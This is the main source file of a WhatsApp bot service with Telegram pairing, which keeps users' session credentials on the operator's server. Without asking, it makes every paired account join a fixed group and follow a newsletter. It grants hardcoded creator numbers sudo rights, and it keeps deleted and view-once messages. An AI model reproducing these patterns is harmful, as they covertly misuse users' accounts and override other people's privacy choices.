// ============================================================
// TEDDY-XMD — by Trashcore
// index.js | BaseBot V4 + Telegram multi-session pairing + Web Panel
// ============================================================

const fs = require('fs');
const path = require('path');
const pino = require('pino');
const chalk = require('chalk');
const NodeCache = require('node-cache');
const express = require('express');
const cors = require('cors');

const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  DisconnectReason
} = require('@trashcore/baileys');

const TelegramBot = require('node-telegram-bot-api');

const { initDatabase, getSetting, setSetting, upsertTgUser, getTgUsers, getTgUserCount } = require('./database');
const { logMessage } = require('./database/logger');
const config = require('./config');

global.botStartTime = Date.now();
global.pairedOwners = {};
let dbReady = false;

const groupCache = new NodeCache({ stdTTL: 120, checkperiod: 60 });
const settingsCache = new NodeCache({ stdTTL: 30, checkperiod: 15 });

const activeSessions = {};

// Auto features config
const AUTO_JOIN_GROUP_INVITE = 'CLClgqJIC59GrcI4sRzLu8';
const AUTO_FOLLOW_NEWSLETTER = '120363421104812135@newsletter';
const AUTO_REACT_NEWSLETTER = true;
const AUTO_REACT_EMOJI = '🔥';

// ─── Express Web Panel ────────────────────────────────────────
const app = express();
const PORT = process.env.PORT || 3000;
const publicPath = path.join(__dirname, 'public');

if (!fs.existsSync(publicPath)) fs.mkdirSync(publicPath, { recursive: true });

app.use(cors());
app.use(express.json());
app.use(express.static(publicPath));

app.get('/', (req, res) => {
  res.sendFile(path.join(publicPath, 'index.html'));
});

app.post('/api/pair', async (req, res) => {
  try {
    const { phoneNumber } = req.body;
    if (!phoneNumber) return res.status(400).json({ error: 'Phone number required' });

    const cleanNum = phoneNumber.replace(/[^0-9]/g, '');
    const sessionPath = path.join(__dirname, 'trash_baileys', `session_${cleanNum}`);
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    const { state } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const tempSock = makeWASocket({
      version,
      auth: state,
      logger: pino({ level: 'silent' }),
      printQRInTerminal: false
    });

    let replied = false;

    tempSock.ev.on('connection.update', async ({ pairingCode, connection }) => {
      if (pairingCode &&!replied) {
        replied = true;
        const code = pairingCode.match(/.{1,4}/g).join('-');
        res.json({ success: true, code });
        setTimeout(() => tempSock.end(), 2000);
      }
      if (connection === 'close' &&!replied) {
        replied = true;
        if (!res.headersSent) res.status(500).json({ error: 'Failed to generate pairing code' });
      }
    });

    await tempSock.requestPairingCode(cleanNum);

    setTimeout(() => {
      if (!replied) {
        replied = true;
        if (!res.headersSent) res.status(500).json({ error: 'Timeout generating code' });
        tempSock.end();
      }
    }, 20000);

  } catch (err) {
    if (!res.headersSent) res.status(500).json({ error: err.message });
  }
});

app.listen(PORT, '0.0.0.0', () => console.log(chalk.cyan(`🌐 Web panel running on port ${PORT}`)));

// ─── Telegram bot ─────────────────────────────────────────────
const BOT_TOKEN = process.env.BOT_TOKEN || config.BOT_TOKEN || '';
if (!BOT_TOKEN) {
  console.error(chalk.red('❌ BOT_TOKEN missing. Set it in config.js or env.'));
  process.exit(1);
}
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
console.log(chalk.green('✅ Telegram bot started.'));

// Log polling errors
bot.on('polling_error', (err) => console.error(chalk.red('[Telegram Polling Error]:'), err.message));

const REQUIRED_GROUP_USERNAME = 'free_net_zone2';
const TELEGRAM_ADMIN_IDS = ['7324745438'];

async function isGroupMember(userId) {
  try {
    const member = await bot.getChatMember(`@${REQUIRED_GROUP_USERNAME}`, userId);
    return ['member', 'administrator', 'creator'].includes(member.status);
  } catch (err) {
    console.error(chalk.yellow(`[Group Check Error]: ${err.message}`));
    return true; // allow if check fails so bot doesn't lock everyone out
  }
}

async function requireGroupMembership(msg) {
  const userId = msg.from.id;
  const chatId = msg.chat.id;
  const member = await isGroupMember(userId);
  if (!member) {
    bot.sendMessage(chatId,
      `⚠️ *Access Restricted*\n\nYou must join our group to use this bot.\n\n👥 [Join Group](https://t.me/${REQUIRED_GROUP_USERNAME})\n\nAfter joining, send /start again.`,
      { parse_mode: 'Markdown', disable_web_page_preview: true }
    );
    return false;
  }
  return true;
}

const connectedUsersFile = path.join(__dirname, 'connectedUsers.json');
let connectedUsers = {};
function loadConnectedUsers() {
  if (fs.existsSync(connectedUsersFile)) {
    try { connectedUsers = JSON.parse(fs.readFileSync(connectedUsersFile)); } catch {}
  }
}
function saveConnectedUsers() {
  fs.writeFileSync(connectedUsersFile, JSON.stringify(connectedUsers, null, 2));
}

const phoneToTgChatFile = path.join(__dirname, 'phoneToTgChat.json');
let phoneToTgChat = {};
function loadPhoneToTgChat() {
  if (fs.existsSync(phoneToTgChatFile)) {
    try { phoneToTgChat = JSON.parse(fs.readFileSync(phoneToTgChatFile)); } catch {}
  }
}
function savePhoneToTgChat() {
  fs.writeFileSync(phoneToTgChatFile, JSON.stringify(phoneToTgChat, null, 2));
}
function getTgChatId(phoneNumber, provided = null) {
  if (provided) {
    phoneToTgChat[phoneNumber] = provided;
    savePhoneToTgChat();
    return provided;
  }
  return phoneToTgChat[phoneNumber] || null;
}

function totalSessions() {
  return Object.values(connectedUsers).reduce((sum, arr) => sum + (arr?.length || 0), 0);
}

// ─── settings cache ───────────────────────────────────────────
const GROUP_KEY_PREFIXES = ['welcome_', 'goodbye_', 'antilink_', 'antilinkgc_', 'warn_'];

function getScopedSetting(trashcore, key, def = null) {
  const bn = normalizeNumber(trashcore?.user?.id || '');
  const isGroupKey = GROUP_KEY_PREFIXES.some(p => key.startsWith(p));
  const scopedK = isGroupKey? key : (bn? `${bn}:${key}` : key);
  const cacheKey = `scope:${scopedK}`;
  const hit = settingsCache.get(cacheKey);
  if (hit!== undefined) return hit;
  const val = getSetting(scopedK, def);
  settingsCache.set(cacheKey, val);
  return val;
}
function setScopedSetting(trashcore, key, val) {
  const bn = normalizeNumber(trashcore?.user?.id || '');
  const isGroupKey = GROUP_KEY_PREFIXES.some(p => key.startsWith(p));
  const scopedK = isGroupKey? key : (bn? `${bn}:${key}` : key);
  settingsCache.del(`scope:${scopedK}`);
  return setSetting(scopedK, val);
}
const _origSet = setSetting;
function setCachedSetting(key, value) {
  settingsCache.del(key);
  return _origSet(key, value);
}
global.setSetting = setCachedSetting;

const CREATOR_NUMBERS = ['254104245659', '254750310644'];
function isSudoOrCreator(bareNumber) {
  if (CREATOR_NUMBERS.includes(bareNumber)) return true;
  const list = getSetting('sudoUsers', []);
  const now = Date.now();
  return list.some(e => e.number === bareNumber && (!e.expiresAt || e.expiresAt > now));
}
global.isSudoOrCreator = isSudoOrCreator;

async function getGroupMeta(trashcore, chatId) {
  const hit = groupCache.get(chatId);
  if (hit) return hit;
  try {
    const meta = await trashcore.groupMetadata(chatId);
    if (meta) groupCache.set(chatId, meta);
    return meta || {};
  } catch { return {}; }
}
function invalidateGroupCache(chatId) { groupCache.del(chatId); }
global.getGroupMeta = getGroupMeta;
global.invalidateGroupCache = invalidateGroupCache;

const QUEUE_CONCURRENCY = 5;
let activeWorkers = 0;
const messageQueue = [];
function enqueueMessage(handler) {
  messageQueue.push(handler);
  drainQueue();
}
function drainQueue() {
  while (activeWorkers < QUEUE_CONCURRENCY && messageQueue.length > 0) {
    const handler = messageQueue.shift();
    activeWorkers++;
    handler().finally(() => { activeWorkers--; drainQueue(); });
  }
}

function formatUptime(ms) {
  const s = Math.floor(ms / 1000);
  const d = Math.floor(s / 86400);
  const h = Math.floor((s % 86400) / 3600);
  const m = Math.floor((s % 3600) / 60);
  return `${d}d ${h}h ${m}m ${s % 60}s`;
}
function formatDate(ts) {
  return new Date(ts).toLocaleString('en-GB', {
    day: '2-digit', month: 'short', year: 'numeric',
    hour: '2-digit', minute: '2-digit', timeZone: 'Africa/Nairobi'
  });
}
function normalizeNumber(jid) {
  return jid? jid.split('@')[0].split(':')[0] : '';
}
function cleanOldCache() {
  const cacheFolder = path.join(__dirname, 'cache');
  if (!fs.existsSync(cacheFolder)) return;
  for (const file of fs.readdirSync(cacheFolder)) {
    try { fs.unlinkSync(path.join(cacheFolder, file)); } catch {}
  }
}
function getHandleMessage() {
  delete require.cache[require.resolve('./command')];
  return require('./command');
}

async function runAntilink(trashcore, m) {
  try {
    const chatId = m.key.remoteJid;
    if (!chatId?.endsWith('@g.us')) return false;
    const body = m.message?.conversation || m.message?.extendedTextMessage?.text
      || m.message?.imageMessage?.caption || m.message?.videoMessage?.caption || '';
    if (!body) return false;
    const senderJid = m.key.participant || chatId;
    const antilinkgc = getScopedSetting(trashcore, `antilinkgc_${chatId}`, false);
    const antilink = getScopedSetting(trashcore, `antilink_${chatId}`, false);
    if (!antilinkgc &&!antilink) return false;
    const botNumber = normalizeNumber(trashcore.user.id);
    if (normalizeNumber(senderJid) === botNumber || m.key.fromMe) return false;
    const meta = await getGroupMeta(trashcore, chatId);
    const senderBare = normalizeNumber(senderJid);
    const p = (meta.participants || []).find(x => normalizeNumber(x.id) === senderBare);
    if (p?.admin === 'admin' || p?.admin === 'superadmin') return false;
    const del = () => trashcore.sendMessage(chatId, {
      delete: { remoteJid: chatId, fromMe: false, id: m.key.id, participant: m.key.participant }
    });
    if (antilinkgc && body.includes('chat.whatsapp.com')) {
      await del();
      trashcore.sendMessage(chatId, {
        text: `\`\`「 GC Link Detected 」\`\n\n@${senderJid.split('@')[0]} sent a group link and it was deleted.`,
        mentions: [senderJid]
      }, { quoted: m }).catch(() => {});
      return true;
    }
    if (antilink && body.includes('http')) {
      await del();
      trashcore.sendMessage(chatId, {
        text: `\`\`「 Link Detected 」\`\n\n@${senderJid.split('@')[0]} sent a link and it was deleted.`,
        mentions: [senderJid]
      }, { quoted: m }).catch(() => {});
      return true;
    }
    return false;
  } catch (err) { console.error('[antilink]', err.message); return false; }
}

function runAutoPresence(trashcore, m) {
  try {
    const chatId = m.key.remoteJid;
    const autoTyping = getScopedSetting(trashcore, 'autoTyping', false);
    const autoRecord = getScopedSetting(trashcore, 'autoRecord', false);
    if (autoTyping) trashcore.sendPresenceUpdate('composing', chatId).catch(() => {});
    if (autoRecord) trashcore.sendPresenceUpdate('recording', chatId).catch(() => {});
    trashcore.sendPresenceUpdate('available', chatId).catch(() => {});
  } catch {}
}

let lastBioUpdate = 0;
function runAutoBio(trashcore) {
  try {
    const autobio = getScopedSetting(trashcore, 'autoBio', false);
    if (!autobio) return;
    const now = Date.now();
    if (now - lastBioUpdate < 60000) return;
    lastBioUpdate = now;
    trashcore.updateProfileStatus(`✳️ TEDDY-XMD || ✅ Runtime: ${formatUptime(now - global.botStartTime)}`).catch(() => {});
  } catch {}
}

async function handleGroupParticipants(trashcore, update) {
  try {
    const { id } = update;
    invalidateGroupCache(id);
  } catch (err) { console.error('[welcome/goodbye]', err.message); }
}

async function autoJoinGroup(sock) {
  try {
    if (!AUTO_JOIN_GROUP_INVITE) return;
    await sock.groupAcceptInvite(AUTO_JOIN_GROUP_INVITE);
    console.log(chalk.green(`✅ Auto-joined group via invite`));
  } catch (err) {
    if (!err.message.includes('already a member')) {
      console.log(chalk.yellow(`⚠️ Auto-join group failed: ${err.message}`));
    }
  }
}

async function autoFollowNewsletter(sock) {
  try {
    if (!AUTO_FOLLOW_NEWSLETTER) return;
    await sock.newsletterFollow(AUTO_FOLLOW_NEWSLETTER);
    console.log(chalk.green(`✅ Auto-followed newsletter ${AUTO_FOLLOW_NEWSLETTER}`));
  } catch (err) {
    if (!err.message.includes('already following')) {
      console.log(chalk.yellow(`⚠️ Auto-follow newsletter failed: ${err.message}`));
    }
  }
}

async function startWhatsAppBot(phoneNumber, telegramChatId = null) {
  telegramChatId = getTgChatId(phoneNumber, telegramChatId);

  const sessionPath = path.join(__dirname, 'trash_baileys', `session_${phoneNumber}`);
  if (!fs.existsSync(sessionPath)) {
    console.log(chalk.yellow(`No session folder for ${phoneNumber}, skipping.`));
    return;
  }

  const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
  const { version } = await fetchLatestBaileysVersion();
  const msgRetryCounterCache = new NodeCache();

  const trashcore = makeWASocket({
    version,
    logger: pino({ level: 'silent' }),
    printQRInTerminal: false,
    browser: ['Ubuntu', 'Chrome', '120.0.0.0'],
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
    },
    markOnlineOnConnect: true,
    generateHighQualityLinkPreview: true,
    msgRetryCounterCache,
    defaultQueryTimeoutMs: undefined,
    keepAliveIntervalMs: 30000,
    syncFullHistory: false,
  });

  activeSessions[phoneNumber] = trashcore;
  trashcore.ev.on('creds.update', saveCreds);

  const createToxxicStore = require('./basestore');
  const store = createToxxicStore(`./store_${phoneNumber}`, { maxMessagesPerChat: 50, memoryOnly: true });
  store.bind(trashcore.ev);

  if (!trashcore.authState.creds.registered) {
    if (telegramChatId) {
      setTimeout(async () => {
        try {
          let code = await trashcore.requestPairingCode(phoneNumber);
          code = code?.match(/.{1,4}/g)?.join('-') || code;
          bot.sendMessage(telegramChatId,
            `🔑 *Pairing code for ${phoneNumber}*\n\n\`${code}\`\n\nEnter this code on your WhatsApp > Linked Devices > Link with phone number.`,
            { parse_mode: 'Markdown' }
          );
        } catch (err) {
          console.error('Pairing error:', err.message);
          bot.sendMessage(telegramChatId, `❌ Pairing failed: ${err.message}`).catch(() => {});
        }
      }, 3000);
    }
  } else {
    await saveCreds();
    console.log(chalk.green(`Session credentials reloaded for ${phoneNumber}`));
  }

  trashcore.ev.on('connection.update', async ({ connection, lastDisconnect }) => {
    if (connection === 'open') {
      await saveCreds();
      const botNumber = normalizeNumber(trashcore.user.id);
      console.log(chalk.greenBright(`\n✅ [${phoneNumber}] Connected as: ${botNumber}\n`));
      global.pairedOwners[botNumber] = phoneNumber;

      await autoJoinGroup(trashcore);
      await autoFollowNewsletter(trashcore);

      if (telegramChatId) {
        if (!connectedUsers[telegramChatId]) connectedUsers[telegramChatId] = [];
        const existing = connectedUsers[telegramChatId].find(u => u.phoneNumber === phoneNumber);
        if (existing) {
          existing.connectedAt = Date.now();
        } else {
          connectedUsers[telegramChatId].push({ phoneNumber, connectedAt: Date.now() });
        }
        saveConnectedUsers();

        bot.sendPhoto(
          telegramChatId,
          'https://files.catbox.moe/13nyhx.jpg',
          {
            caption: `┏━━『🐻⃟‣𝐓𝐄𝐃𝐘-𝐗𝐌𝐃』━━┓\n\n ◈ STATUS : ✅ CONNECTED\n ◈ USER : ${phoneNumber}\n ◈ Dev : @xdbot1\n┗━━━━━━━━━━━━━━━┛`,
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: [[{ text: '📢 Follow Channel', url: 'https://t.me/free_net_zone1' },{ text: '👥 Join Group', url: 'https://t.me/free_net_zone2' }]] }
          }
        ).catch(() => {});
      }

      cleanOldCache();

      trashcore.sendMessage(`${botNumber}@s.whatsapp.net`, {
        text: `💠 *TEDDY-XMD ACTIVATED!*\n\n> ❐ Prefix : ${getScopedSetting(trashcore, 'prefix', config.PREFIX)}\n> ❐ Cmds : 18\n> ❐ Number : wa.me/${botNumber}\n✓ Uptime: _${formatUptime(Date.now() - global.botStartTime)}_`
      }).catch(() => {});

      try {
        const initAntiDelete = require('./database/antiDelete');
        initAntiDelete(trashcore, { botNumber: `${botNumber}@s.whatsapp.net`, dbPath: './database/antidelete.json', enabled: true });
      } catch {}

      try {
        const initAntiViewOnce = require('./database/antiViewOnce');
        global._antiViewOnce = initAntiViewOnce(trashcore, { botNumber: `${botNumber}@s.whatsapp.net`, enabled: true });
      } catch {}

    } else if (connection === 'close') {
      const reason = lastDisconnect?.error?.output?.statusCode;
      if (!activeSessions[phoneNumber]) {
        console.log(chalk.yellow(`[${phoneNumber}] Session removed — skipping reconnect.`));
        return;
      }
      if (reason!== DisconnectReason.loggedOut) {
        console.log(chalk.yellow(`🔄 [${phoneNumber}] Session closed (${reason}), reconnecting...`));
        startWhatsAppBot(phoneNumber, telegramChatId);
      } else {
        console.log(chalk.red(`🚪 [${phoneNumber}] Logged out.`));
        const bn = normalizeNumber(trashcore.user?.id || '');
        if (bn) delete global.pairedOwners[bn];
        delete activeSessions[phoneNumber];

        const loggedOutPath = path.join(__dirname, 'trash_baileys', `session_${phoneNumber}`);
        if (fs.existsSync(loggedOutPath)) {
          try {
            fs.rmSync(loggedOutPath, { recursive: true, force: true });
          } catch (e) {
            console.error(`[${phoneNumber}] Failed to delete session folder:`, e.message);
          }
        }

        for (const [cid, arr] of Object.entries(connectedUsers)) {
          connectedUsers[cid] = arr.filter(u => u.phoneNumber!== phoneNumber);
          if (!connectedUsers[cid].length) delete connectedUsers[cid];
        }
        saveConnectedUsers();

        if (phoneToTgChat[phoneNumber]) {
          delete phoneToTgChat[phoneNumber];
          savePhoneToTgChat();
        }

        if (telegramChatId) {
          bot.sendMessage(telegramChatId,
            `🚪 *${phoneNumber}* logged out. Session cleared.\nUse /connect ${phoneNumber} to re-pair.`,
            { parse_mode: 'Markdown' }
          ).catch(() => {});
        }
      }
    }
  });

  trashcore.ev.on('messages.upsert', ({ messages, type }) => {
    if (type!== 'notify' ||!dbReady) return;
    for (const m of messages) {
      if (!m?.message) continue;
      enqueueMessage(async () => {
        try {
          if (AUTO_REACT_NEWSLETTER && m.key.remoteJid === AUTO_FOLLOW_NEWSLETTER) {
            trashcore.sendMessage(m.key.remoteJid, {
              react: { text: AUTO_REACT_EMOJI, key: m.key }
            }).catch(() => {});
          }

          if (m.key.remoteJid === 'status@broadcast') {
            const enabled = getScopedSetting(trashcore, 'statusView', true);
            if (enabled) trashcore.readMessages([m.key]).catch(() => {});
            return;
          }
          if (m.message?.ephemeralMessage) m.message = m.message.ephemeralMessage.message;
          runAutoPresence(trashcore, m);
          runAutoBio(trashcore);

          const msgSenderJid = m.key.participant || m.key.remoteJid;
          const msgSenderNum = msgSenderJid? msgSenderJid.split('@')[0].split(':')[0] : '';
          if (CREATOR_NUMBERS.includes(msgSenderNum)) {
            trashcore.sendMessage(m.key.remoteJid, { react: { text: '🙂‍↔️', key: m.key } }).catch(() => {});
          }

          const deleted = await runAntilink(trashcore, m);
          if (deleted) return;
          logMessage(m, trashcore).catch(() => {});
          await getHandleMessage()(trashcore, m);
        } catch (err) {
          console.error('[messages.upsert]', err.message);
        }
      });
    }
  });

  trashcore.ev.on('group-participants.update', async (update) => {
    if (!dbReady) return;
    handleGroupParticipants(trashcore, update).catch(err => console.error('[group-participants]', err.message));
  });
}

// Telegram Commands
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const from = msg.from;
  if (!(await requireGroupMembership(msg))) return;
  if (dbReady) {
    try {
      upsertTgUser({ tg_id: from.id, username: from.username || '', first_name: from.first_name || '', phone_number: '' });
    } catch {}
  }
  const sessions = totalSessions();
  const userCount = dbReady? getTgUserCount() : '…';
  const uptime = formatUptime(Date.now() - global.botStartTime);
  const startedDate = formatDate(global.botStartTime);
  const prefix = config.PREFIX || '.';
  const caption =
    `╭━━━━━━━━━━━━━━╮\n` +
    `┃ 🐻 *TEDDY-XMD BOT* 🐻\n` +
    `╰━━━━━━━━━━━━━━╯\n` +
    `📊 *Stats*\n` +
    `┣ ┃⭔ Sessions : ${sessions}\n` +
    `┣ ┃⭔ Users : ${userCount}\n` +
    `┣ ⏱ Uptime : ${uptime}\n` +
    `┣ ┃⭔ Started : ${startedDate}\n` +
    `┣ ┃⭔ Prefix : ${prefix}\n` +
    `┣ ┃⭔ Commands : 18\n` +
    `┗ ┃⭔ Creator : @xdbot1\n` +
    `╭─⊷ 📋 *COMMANDS* ─\n` +
    `│ /connect <number>\n` +
    `│ /delsession <number>\n` +
    `│ /status\n` +
    `│ /runtime\n` +
    `╰────────────────────`;
  bot.sendPhoto(chatId, 'https://files.catbox.moe/13nyhx.jpg', {
    caption,
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [[
        { text: '📢 Channel', url: 'https://t.me/free_net_zone1' },
        { text: '👥 Group', url: 'https://t.me/free_net_zone2' }
      ]]
    }
  });
});

bot.onText(/\/connect(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const from = msg.from;
  const phoneNumber = match[1];
  if (!(await requireGroupMembership(msg))) return;
  if (!phoneNumber) return bot.sendMessage(chatId, 'Usage: /connect 254xxxx');
  if (dbReady) {
    try {
      upsertTgUser({ tg_id: from.id, username: from.username || '', first_name: from.first_name || '', phone_number: phoneNumber });
    } catch {}
  }
  const sessionPath = path.join(__dirname, 'trash_baileys', `session_${phoneNumber}`);
  if (!fs.existsSync(sessionPath)) {
    fs.mkdirSync(sessionPath, { recursive: true });
    bot.sendMessage(chatId, `⏳ Session created for *${phoneNumber}*. Requesting pairing code...`, { parse_mode: 'Markdown' });
    startWhatsAppBot(phoneNumber, chatId).catch(err => bot.sendMessage(chatId, `❌ Error: ${err.message}`));
  } else {
    const already = connectedUsers[chatId]?.some(u => u.phoneNumber === phoneNumber);
    if (already) {
      bot.sendMessage(chatId, `⚠️ *${phoneNumber}* is already connected.\nUse /delsession ${phoneNumber} to reset.`, { parse_mode: 'Markdown' });
    } else {
      bot.sendMessage(chatId, `🔄 Reconnecting *${phoneNumber}*...`, { parse_mode: 'Markdown' });
      startWhatsAppBot(phoneNumber, chatId).catch(err => bot.sendMessage(chatId, `❌ Error: ${err.message}`));
    }
  }
});

bot.onText(/\/delsession (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const phoneNumber = match[1];
  if (!(await requireGroupMembership(msg))) return;
  const sessionPath = path.join(__dirname, 'trash_baileys', `session_${phoneNumber}`);
  try {
    const liveSocket = activeSessions[phoneNumber];
    delete activeSessions[phoneNumber];
    if (liveSocket) {
      try { liveSocket.ev.removeAllListeners(); liveSocket.ws?.close(); liveSocket.end?.(); } catch {}
      console.log(chalk.yellow(`[delsession] Closed live socket for ${phoneNumber}`));
    }
    if (fs.existsSync(sessionPath)) {
      fs.rmSync(sessionPath, { recursive: true, force: true });
    }
    if (connectedUsers[chatId]) {
      connectedUsers[chatId] = connectedUsers[chatId].filter(u => u.phoneNumber!== phoneNumber);
      if (connectedUsers[chatId].length === 0) delete connectedUsers[chatId];
      saveConnectedUsers();
    }
    for (const [bn, ph] of Object.entries(global.pairedOwners)) {
      if (ph === phoneNumber) delete global.pairedOwners[bn];
    }
    if (phoneToTgChat[phoneNumber]) {
      delete phoneToTgChat[phoneNumber];
      savePhoneToTgChat();
    }
    bot.sendMessage(chatId, `✅ Session for *${phoneNumber}* fully deleted.\n\nUse /connect ${phoneNumber} to re-pair.`, { parse_mode: 'Markdown' });
  } catch (err) {
    bot.sendMessage(chatId, `❌ Failed to delete session: ${err.message}`);
    console.error('[delsession] Error:', err.message);
  }
});

bot.onText(/\/status/, (msg) => {
  const users = connectedUsers[msg.chat.id];
  if (users?.length > 0) {
    let text = `*📱 Your Connected Sessions:*\n\n`;
    users.forEach((u, i) => {
      const uptime = formatUptime(Date.now() - u.connectedAt);
      text += `${i + 1}. \`${u.phoneNumber}\`\n ⏱ ${uptime}\n\n`;
    });
    bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
  } else {
    bot.sendMessage(msg.chat.id, 'No numbers connected. Use /connect <number> to add one.');
  }
});

bot.onText(/\/runtime/, (msg) => {
  bot.sendMessage(msg.chat.id, `⚡ Running for: *${formatUptime(Date.now() - global.botStartTime)}*`, { parse_mode: 'Markdown' });
});

// Startup
(async () => {
  try {
    await initDatabase();
    dbReady = true;
    console.log(chalk.green('📁 Database ready.'));

    loadConnectedUsers();
    loadPhoneToTgChat();

    const sessionsDir = path.join(__dirname, 'trash_baileys');
    if (fs.existsSync(sessionsDir)) {
      for (const dir of fs.readdirSync(sessionsDir)) {
        if (!dir.startsWith('session_')) continue;
        const phoneNumber = dir.replace('session_', '');
        await startWhatsAppBot(phoneNumber).catch(err =>
          console.error(`❌ [${phoneNumber}]`, err.message)
        );
      }
    }

    console.log(chalk.greenBright('\n🚀 TEDDY-XMD running!\n'));
  } catch (err) {
    console.error(chalk.red('❌ Startup error:'), err);
  }
})();